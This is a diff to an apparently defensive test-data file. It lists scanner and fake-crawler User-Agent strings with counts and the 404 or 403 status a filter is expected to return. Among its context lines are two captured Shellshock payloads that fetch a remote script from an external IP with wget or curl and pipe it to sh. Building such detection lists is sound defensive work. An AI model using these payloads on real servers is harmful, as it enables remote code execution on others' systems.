@@ -4,7 +4,9 @@
 {"count":21601,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/8.7.1"}
 {"count":19934,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"l9explore/1.2.2"}
 {"count":10917,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 zgrab/0.x"}
+{"count":1789,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"}
 {"count":1353,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"}
+{"count":1053,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (l9scan/2.0.732323e2838313e21353e2538313; +https://leakix.net)"}
 {"count":757,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"}
 {"count":554,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/8.1.2"}
 {"count":526,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.25.1"}
@@ -21,6 +23,7 @@
 {"count":131,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.22.0"}
 {"count":120,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"l9explore/1.3.0"}
 {"count":111,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.6 aiohttp/3.8.6"}
+{"count":108,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"fhms-its-research-scanner/1.0 (+https://fb02itsscan02.fh-muenster.de)"}
 {"count":99,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 zgrab/2.0 http://cdn-measurements.softsec.rub.de/"}
 {"count":98,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.32.5"}
 {"count":94,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.20.0"}
@@ -51,6 +54,7 @@
 {"count":10,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.74.0"}
 {"count":9,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.11 aiohttp/3.11.18"}
 {"count":9,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.33.1"}
+{"count":8,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (compatible; NetScope-DomainScanner/1.0; security research scanner)"}
 {"count":8,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.10 aiohttp/3.13.3"}
 {"count":8,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.6 aiohttp/3.8.3"}
 {"count":8,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.47.0"}
@@ -58,6 +62,9 @@
 {"count":8,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.12.4"}
 {"count":7,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.3.2"}
 {"count":7,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.35.0"}
+{"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1"}
+{"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 7.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.9 (.NET CLR 3.5.30729)"}
+{"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozlila/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"}
 {"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.11 aiohttp/3.12.14"}
 {"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.12 aiohttp/3.12.15"}
 {"count":6,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.7 aiohttp/3.7.4.post0"}
@@ -67,6 +74,7 @@
 {"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.10 aiohttp/3.9.0"}
 {"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl"}
 {"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.29.0"}
+{"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"pathscan/0.1.0"}
 {"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.28.0"}
 {"count":5,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.76.1.el7.x86_64"}
 {"count":4,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.11 aiohttp/3.12.11"}
@@ -81,6 +89,11 @@
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"() { :; }; /bin/bash -c \\x22(wget -qO- http://41.231.37.153/rondo.ame.sh||busybox wget -qO- http://41.231.37.153/rondo.ame.sh||curl -s http://41.231.37.153/rondo.ame.sh)|sh\\x22& # rondo2012@atomicmail.io"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"() { :; }; /bin/bash -c \\x22(wget -qO- http://41.231.37.153/rondo.fve.sh||busybox wget -qO- http://41.231.37.153/rondo.fve.sh||curl -s http://41.231.37.153/rondo.fve.sh)|sh\\x22& # rondo2012@atomicmail.io"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)"}
+{"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows NT 7.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"}
+{"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.7"}
+{"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 Chrome/2.0.172.6 Safari/530.7"}
+{"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8"}
+{"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.11 aiohttp/3.11.11"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.11 aiohttp/3.12.2"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.13 aiohttp/3.12.11"}
@@ -89,6 +102,12 @@
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"curl/7.76.0"}
 {"count":3,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)"}
 {"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Libcurl/7.58.0"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/5.0 (compatible; CMSLookup/1.0)"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0.1"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.7.43.25 Safari/537.36"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows NT 7.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.27 Safari/532.0"}
+{"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/8.0 Mobile/10A5376e Safari/8536.25"}
 {"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"PycURL/7.45.2 libcurl/7.68.0 OpenSSL/1.1.1f zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.21.0 (+libidn2/2.2.0) libssh/0.9.3/openssl/zlib nghttp2/1.40.0 librtmp/2.3"}
 {"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.10 aiohttp/3.8.5"}
 {"count":2,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.10 aiohttp/3.9.2"}
@@ -227,7 +246,10 @@
 {"count":1,"dim":"fakebot","expected_reason":"fake_bot","expected_status":403,"header":"User-Agent","src":"crawler-ua","value":"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; PerplexityBot/1.0; +https://perplexity.ai/perplexitybot)"}
 {"count":1,"dim":"fakebot","expected_reason":"fake_bot","expected_status":403,"header":"User-Agent","src":"crawler-ua","value":"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"}
 {"count":1,"dim":"fakebot","expected_reason":"fake_bot","expected_status":403,"header":"User-Agent","src":"crawler-ua","value":"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Safari/537.36"}
+{"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Mozilla/6.0 (Macintosh; I; Intel Mac OS X 11_7_9; de-LI; rv:1.9b4) Gecko/2012010317 Firefox/10.0a4"}
+{"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"crs","value":"Mozlila"}
 {"count":1,"dim":"fakebot","expected_reason":"fake_bot","expected_status":403,"header":"User-Agent","src":"crawler-ua","value":"Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"}
+{"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"ProxyChecker/1.0"}
 {"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"seclists","value":"PycURL"}
 {"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"seclists","value":"PycURL/7.xx.x"}
 {"count":1,"dim":"ua","expected_reason":"scanner_ua","expected_status":404,"header":"User-Agent","src":"corpus","value":"Python/3.10 aiohttp/3.10.8"}
